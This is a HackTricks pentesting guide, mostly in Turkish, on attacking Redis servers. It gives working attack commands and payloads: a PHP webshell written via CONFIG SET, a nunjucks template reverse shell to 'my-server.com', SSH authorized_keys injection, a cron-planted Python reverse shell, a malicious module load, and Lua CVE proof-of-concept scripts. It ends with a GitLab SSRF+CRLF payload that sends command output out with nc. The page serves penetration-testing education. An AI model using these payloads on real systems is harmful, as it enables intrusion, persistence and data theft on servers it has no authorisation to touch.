# 6379 - Pentesting Redis

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

From [the docs](https://redis.io/topics/introduction): Redis açık kaynaklı (BSD lisanslı), bellek içi bir **veri yapısı deposu**, **veritabanı**, önbellek ve mesaj aracısı olarak kullanılır).

Varsayılan olarak Redis düz metin tabanlı bir protokol kullanır, ancak **ssl/tls**'yi de uygulayabileceğini unutmayın. Nasıl çalıştırılacağını öğrenin: [run Redis with ssl/tls here](https://fossies.org/linux/redis/TLS.md).

**Varsayılan port:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Otomatik Enumeration

Bir redis instance'ından bilgi edinmeye yardımcı olabilecek bazı otomatik araçlar:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Manuel Keşif

### Banner

Redis bir **metin tabanlı protokol**dür, **komutu bir sokete gönderebilirsiniz** ve dönen değerler okunabilir olacaktır. Ayrıca Redis'in **ssl/tls** kullanarak çalışabileceğini unutmayın (ama bu çok garip).

Normal bir Redis örneğinde `nc` kullanarak bağlanabilir veya `redis-cli` da kullanabilirsiniz:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
Deneyebileceğiniz **ilk komut** **`info`**'dir. Bu, **Redis örneği hakkında bilgi içeren bir çıktı döndürebilir** **veya benzer bir şey**, aşağıdaki gibi bir çıktı verebilir:
```
-NOAUTH Authentication required.
```
Son durumda bu, Redis örneğine erişmek için **geçerli kimlik bilgilerine ihtiyacınız olduğu** anlamına gelir.

### Redis Authentication

**Varsayılan olarak** Redis'e **kimlik bilgisi olmadan** erişilebilir. Ancak, **yalnızca parola** veya **kullanıcı adı + parola** desteği verecek şekilde **yapılandırılabilir**.\
Bir parolayı _**redis.conf**_ dosyasında `requirepass` parametresi ile **ayarlamak** mümkündür veya hizmet yeniden başlatılana kadar geçici olarak bağlanıp şu komutu çalıştırarak: `config set requirepass p@ss$12E45`.\
Ayrıca, bir **kullanıcı adı** _**redis.conf**_ dosyasında `masteruser` parametresi ile yapılandırılabilir.

> [!TIP]
> Eğer sadece parola yapılandırıldıysa kullanılan kullanıcı adı "**default**".\
> Ayrıca, Redis'in sadece parola mı yoksa kullanıcı adı+parola mı ile yapılandırıldığını dışarıdan tespit etmenin **hiçbir yolu olmadığını** unutmayın.

Bu gibi durumlarda Redis ile etkileşim kurmak için **geçerli kimlik bilgilerini bulmanız gerekecektir**, bu yüzden [**brute-force**](../generic-hacking/brute-force.md#redis) yapmayı deneyebilirsiniz.\
**Geçerli kimlik bilgilerini bulduğunuzda, bağlantıyı kurduktan sonra oturumu kimlik doğrulamanız gerekir** şu komutla:
```bash
AUTH <username> <password>
```
**Geçerli kimlik bilgileri** şu şekilde yanıtlanır: `+OK`

### **Kimlik doğrulamalı keşif**

Eğer Redis sunucusu **anonim bağlantılara** izin veriyorsa veya geçerli kimlik bilgileri elde ettiyseniz, hizmet için keşif sürecini aşağıdaki **komutları** kullanarak başlatabilirsiniz:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Diğer Redis komutları** [**can be found here**](https://redis.io/topics/data-types-intro) **ve** [**here**](https://lzone.de/cheat-sheet/Redis)**.**

Dikkat: **Bir instance'ın Redis komutları yeniden adlandırılabilir** veya _redis.conf_ dosyasında kaldırılabilir. Örneğin bu satır FLUSHDB komutunu kaldıracaktır:
```
rename-command FLUSHDB ""
```
More about configuring securely a Redis service here: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Ayrıca yürütülen Redis komutlarını gerçek zamanlı olarak **`monitor`** komutuyla izleyebilir veya en yavaş **25** sorguyu **`slowlog get 25`** ile alabilirsiniz.

Find more interesting information about more Redis commands here: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Veritabanı Dökümü**

Redis'te **veritabanları 0'dan başlayarak numaralandırılır**. `info` komutunun çıktısındaki "Keyspace" bölümünde herhangi birinin kullanılıp kullanılmadığını görebilirsiniz:

![](<../images/image (766).png>)

Veya tüm **keyspaces** (veritabanları) şu komutla alabilirsiniz:
```
INFO keyspace
```
Bu örnekte **veritabanı 0 ve 1** kullanılıyor. **Veritabanı 0 4 anahtar içerir ve veritabanı 1 1 anahtar içerir**. Varsayılan olarak Redis veritabanı 0'ı kullanır. Örneğin veritabanı 1'i dump etmek için şunu yapmanız gerekir:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
Eğer `GET <KEY>` çalıştırırken aşağıdaki hatayı alırsanız `-WRONGTYPE Operation against a key holding the wrong kind of value`, bunun nedeni anahtarın bir string veya integer'dan farklı bir şey olması ve görüntülenmesi için özel bir operatör gerektirmesidir.

Anahtarın türünü öğrenmek için `TYPE` komutunu kullanın; aşağıda list ve hash anahtarları için örnekler bulunmaktadır.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Dump veritabanını npm ile**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **veya python ile** [**redis-utils**](https://pypi.org/project/redis-utils/)

## Redis RCE

### Interactive Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) Redis(<=5.0.5) içinde otomatik olarak interactive shell veya reverse shell elde edebilir.
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Bilgi [**here**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). **Web sitesi klasörünün** **yolunu** bilmelisiniz:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
Eğer webshell erişimi başarısız olursa, yedek aldıktan sonra veritabanını boşaltıp tekrar deneyebilirsiniz; veritabanını geri yüklemeyi unutmayın.

### Şablon Webshell

Önceki bölümde olduğu gibi, template engine tarafından yorumlanacak bazı html template dosyalarını overwrite ederek de bir shell elde edebilirsiniz.

Örneğin, [**this writeup**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), takip ederseniz saldırganın nunjucks template engine tarafından yorumlanan bir html'e **rev shell** enjekte ettiğini görebilirsiniz:
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
> [!WARNING]
> Dikkat: **birçok template engine şablonları bellekte cache'ler**, bu yüzden üzerine yazsanız bile yenisi **çalıştırılmayabilir**. Bu durumlarda, ya geliştirici otomatik reload'u aktif bırakmıştır ya da hizmete DoS yapmanız (ve otomatik olarak yeniden başlatılmasını beklemeniz) gerekir.

### SSH

Example [from here](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Lütfen dikkat edin **`config get dir`** sonucu diğer elle yapılan exploit komutlarından sonra değişebilir. Redis'e giriş yaptıktan hemen sonra bunu çalıştırmanız önerilir. **`config get dir`** çıktısında **redis kullanıcısının home**'unu (genellikle _/var/lib/redis_ veya _/home/redis/.ssh_) bulabilirsiniz; bunu bildiğinizde `authenticated_users` dosyasını nereye yazacağınızı ve **redis** kullanıcısıyla ssh üzerinden nasıl erişeceğinizi bilirsiniz. Yazılabilir izniniz olan başka bir geçerli kullanıcının home dizinini biliyorsanız, onu da kötüye kullanabilirsiniz:

1. PC'nizde bir ssh açık-özel anahtar çifti oluşturun: **`ssh-keygen -t rsa`**
2. Public key'i bir dosyaya yazın: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Dosyayı redis'e import edin: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Public key'i redis sunucusundaki **authorized_keys** dosyasına kaydedin:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

5. Son olarak, özel anahtar ile **redis server**'a ssh ile bağlanabilirsiniz: **ssh -i id_rsa redis@10.85.0.52**

**This technique is automated here:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

Ayrıca, sistem kullanıcıları `config set dir /home/USER` ile kontrol edilerek keşfedilebilir; onay sonrası yeni bir `authorized_keys` `/home/USER/.ssh/authorized_keys` yoluna yazılabilir. Kullanıcı adları wordlist'i ile bunu bruteforce etmek ve `authorized_keys` dosyasını overwrite etmek için [redis-rce-ssh](https://github.com/captain-woof/redis-rce-ssh) kullanın.

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
The last example is for Ubuntu, for **Centos**, the above command should be: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

This method can also be used to earn bitcoin ：[yam](https://www.v2ex.com/t/286981#reply14)

### Load Redis Module

1. Following the instructions from [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) you can **compile a redis module to execute arbitrary commands**.
2. Then you need some way to **upload the compiled** module
3. **Load the uploaded module** at runtime with `MODULE LOAD /path/to/mymodule.so`
4. **List loaded modules** to check it was correctly loaded: `MODULE LIST`
5. **Execute** **commands**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

6. Unload the module whenever you want: `MODULE UNLOAD mymodule`

### LUA sandbox bypass

[**Here**](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) you can see that Redis uses the command **EVAL** to execute **Lua code sandboxed**. In the linked post you can see **how to abuse it** using the **dofile** function, but [apparently](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) this isn't no longer possible. Anyway, if you can **bypass the Lua** sandbox you could **execute arbitrary** commands on the system. Also, from the same post you can see some **options to cause DoS**.

Some **CVEs to escape from LUA**:

- [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

#### Redis Lua Scripting Engine: Sandbox Escapes & Memory Corruption (CVE-2025-49844/46817/46818)

Recent Redis releases fixed multiple issues in the embedded Lua engine that allow sandbox escape, memory corruption and cross-user code execution. These techniques apply when:
- Attacker can authenticate to Redis and Lua is enabled (EVAL/EVALSHA or FUNCTION are usable)
- Redis version is older than 8.2.2, 8.0.4, 7.4.6, 7.2.11, or 6.2.20

Tip: If you are new to Lua sandboxing tricks, check this page for general techniques:

{{#ref}}
../generic-methodologies-and-resources/lua/bypass-lua-sandboxes/README.md
{{#endref}}

**Patch-level context:**
- Fixed in: 8.2.2, 8.0.4, 7.4.6, 7.2.11, 6.2.20
- Affected when Lua scripting is enabled and the above versions are not applied

**CVE-2025-49844 — GC-timed Use-After-Free in Lua parser (`lparser.c: luaY_parser`)**
- Idea: Force garbage collection while the parser still references a freshly-inserted TString. When GC reclaims it, the parser uses a freed pointer (UAF) → crash/DoS and potential native code execution outside the Lua sandbox.
- Trigger strategy:
1) Create memory pressure with huge strings to encourage GC activity
2) Explicitly run GC while a large source chunk is being compiled
3) Compile a very large Lua script in a loop until GC aligns with parsing

Minimal EVAL harness to reproduce crashes
```bash
# Auth as needed (-a/--user), then run EVAL with 0 keys
redis-cli -h <host> -p 6379 -a <password> EVAL "\
local a = string.rep('asdf', 65536); \
collectgarbage('collect'); \
local src = string.rep('x', 1024 * 1024); \
local f = loadstring(src); \
return 'done'" 0
```
Notlar:
- GC ile luaY_parser'ı hizalamak için birden çok deneme gerekebilir. Bir çökme UAF'in tetiklendiğini gösterir.
- Sömürüden RCE'ye ulaşmak, Redis Lua sandbox'ın ötesinde memory grooming ve native code pivoting gerektirir.

**CVE-2025-46817 — unpack'ta tam sayı taşması (`lbaselib.c: luaB_unpack`)**
- Temel neden: Sayım `n = e - i + 1` işaretsiz cast'lar (unsigned casts) olmadan hesaplanıyor; bu nedenle uç indeksler wrap yaparak Lua'nın mevcut olandan çok daha fazla öğeyi unpack etmeye çalışmasına yol açıyor → yığın bozulması ve bellek tükenmesi.
- PoC (DoS/mem exhaustion):
```bash
redis-cli -h <host> -p 6379 -a <password> EVAL "return unpack({'a','b','c'}, -1, 2147483647)" 0
```
- Sunucunun çok sayıda değer döndürmeye çalışacağını ve en nihayetinde çökeceğini veya OOM (bellek yetersizliği) olacağını bekleyin.

**CVE-2025-46818 — Temel tür metatable'ları yoluyla kullanıcılar arası ayrıcalık yükseltmesi**
- Temel neden: Motorun başlatılması sırasında, temel türler için metatable'lar (ör. strings, booleans) salt okunur olarak ayarlanmamıştı. Herhangi bir kimlik doğrulaması yapılmış kullanıcı bunları zehirleyerek diğer kullanıcıların daha sonra çağırabileceği yöntemleri enjekte edebilir.
- Example (string metatable poisoning):
```bash
# Inject a method on strings and then exercise it
redis-cli -h <host> -p 6379 -a <password> EVAL "\
getmetatable('').__index = function(_, key) \
if key == 'testfunc' then \
return function() return 'testfuncoutput' end \
end \
end; \
return ('teststring').testfunc()" 0
# → Returns: testfuncoutput
```
- Etki: Kurbanın Redis izinlerini kullanarak Lua sandbox içinde cross-user kod yürütme. Redis ACL bağlamlarında lateral movement/priv-esc için kullanışlı.

### Master-Slave Modülü

​master redis üzerindeki tüm işlemler otomatik olarak slave redis'e senkronize edilir; bu, zafiyetli redis'i bizim kontrol ettiğimiz bir master redis'e bağlı bir slave redis olarak değerlendirebileceğimiz ve böylece kendi redis'imize komut gönderebileceğimiz anlamına gelir.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF aracılığıyla Redis ile iletişim

Eğer **düz metin** bir isteği **Redis'e** gönderebiliyorsanız, Redis isteği satır satır okuyacak ve anlamadığı satırlara sadece hatalarla cevap vererek onunla **iletişim kurabilirsiniz**:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Bu yüzden bir web sitesinde bir **SSRF vuln** bulursanız ve bazı **headers** üzerinde **kontrol** sağlayabiliyorsanız (muhtemelen bir CRLF vuln ile) veya **POST parameters**'ı kontrol edebiliyorsanız, Redis'e keyfi komutlar gönderebilirsiniz.

### Örnek: Gitlab SSRF + CRLF to Shell

Gitlab11.4.7'de bir **SSRF** zafiyeti ve bir **CRLF** keşfedildi. **SSRF** zafiyeti, yeni bir proje oluştururken **import project from URL functionality** içinde bulunuyor ve [0:0:0:0:0:ffff:127.0.0.1] biçiminde (bu 127.0.0.1'e erişir) rastgele IP'lere erişime izin veriyordu; **CRLF** vuln ise **URL**'e sadece **%0D%0A** karakterleri eklenerek istismar ediliyordu.

Bu nedenle, bu zafiyetleri kullanarak **gitlab**'ın kuyrukları yöneten Redis instance'ı ile iletişim kurmak ve bu kuyrukları istismar ederek code execution elde etmek mümkün oldu. Redis queue abuse payload'ı şöyledir:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
Ve `whoami` çalıştırmak ve çıktıyı `nc` ile geri göndermek için **URL encode** isteği **abusing SSRF** ve **CRLF** ile şudur:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Herhangi bir nedenle (bilgiyi aldığı kaynak olan_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _için de) exploitation `git` şemasıyla çalıştı ve `http` şemasıyla çalışmadı._

## Kaynaklar

- [Recent Vulnerabilities in Redis Server’s Lua Scripting Engine (OffSec)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine/)
- [NVD: CVE-2025-49844](https://nvd.nist.gov/vuln/detail/CVE-2025-49844)
- [NVD: CVE-2025-46817](https://nvd.nist.gov/vuln/detail/CVE-2025-46817)
- [NVD: CVE-2025-46818](https://nvd.nist.gov/vuln/detail/CVE-2025-46818)
- [Wiz analysis of Redis RCE (CVE-2025-49844)](https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844)
- [PoC: CVE-2025-49844 — Lua parser UAF](https://github.com/dwisiswant0/CVE-2025-49844)
- [PoC: CVE-2025-46817 — unpack integer overflow](https://github.com/dwisiswant0/CVE-2025-46817)
- [PoC: CVE-2025-46818 — basic-type metatable abuse](https://github.com/dwisiswant0/CVE-2025-46818)

{{#include ../banners/hacktricks-training.md}}
